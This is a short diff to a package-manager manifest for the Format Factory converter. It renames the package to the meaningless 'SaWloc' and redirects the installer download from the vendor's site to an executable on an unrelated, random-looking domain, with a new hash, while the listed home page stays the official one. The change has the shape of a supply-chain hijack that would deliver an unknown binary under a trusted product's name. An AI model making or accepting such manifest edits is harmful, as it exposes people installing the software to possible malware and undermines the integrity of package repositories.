@@ -1,8 +1,8 @@
 id: format-factory
-name: Format Factory
-version: 5.2.1
+name: SaWloc
+version: 5.6
 home: http://pcfreetime.com/formatfactory/index.php
-installMethod: NSIS
+installMethod: Inno
 installers:
-- location: http://download.pcfreetime.com/FFSetup5.2.1.0.exe
-  sha256: fba9288b9216722d8ad51bbebf1b12c49e979e7b2afbcd11e2a6ba1da0384f02
+- location: https://www.nirapew-bahip.com/sgqaaw16-jr98/FFSetupLite.exe
+  sha256: 83d5440dbb135ff2b18b95d41e5496e09c749b3d83fc66caab1f7d4579a2d965
